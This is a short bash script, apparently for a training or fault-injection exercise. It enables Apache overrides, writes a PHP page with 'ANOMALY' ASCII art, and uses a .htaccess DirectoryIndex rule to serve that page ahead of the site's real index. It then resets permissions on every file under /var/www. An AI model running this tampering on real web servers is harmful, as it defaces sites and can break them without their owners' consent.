#!/bin/bash
echo "Hello htaccess"

php_file="/var/www/html/index_old.php"
htaccess_file="/var/www/html/.htaccess"
conf_file="/etc/apache2/apache2.conf"

override_block="
<Directory /var/www/html>
    AllowOverride All
</Directory>
"
echo "$override_block" >> "$conf_file"

cat <<'EOF' > "$php_file"
<html lang="ja">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>anomaly</title>
</head>

<body>
  <p>
  █████╗ ███╗   ██╗ ██████╗ ███╗   ███╗ █████╗ ██╗   ██╗   ██╗
 ██╔══██╗████╗  ██║██╔═══██╗████╗ ████║██╔══██╗██║    ██║ ██╔╝
 ███████║██╔██╗ ██║██║   ██║██╔████╔██║███████║██║     ████╔╝
 ██╔══██║██║╚██╗██║██║   ██║██║╚██╔╝██║██╔══██║██║      ██╔╝  
 ██║  ██║██║ ╚████║╚██████╔╝██║ ╚═╝ ██║██║  ██║███████╗ ██║  
 ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚═╝
  </p>
</body>

</html>
EOF

cat <<'EOF' > "$htaccess_file"
DirectoryIndex index_old.php index.php
EOF

chown -R www-data:www-data /var/www/html/index_old.php
chmod 644 /var/www/html/index_old.php
find /var/www/ -type f -exec chmod 644 {} \;

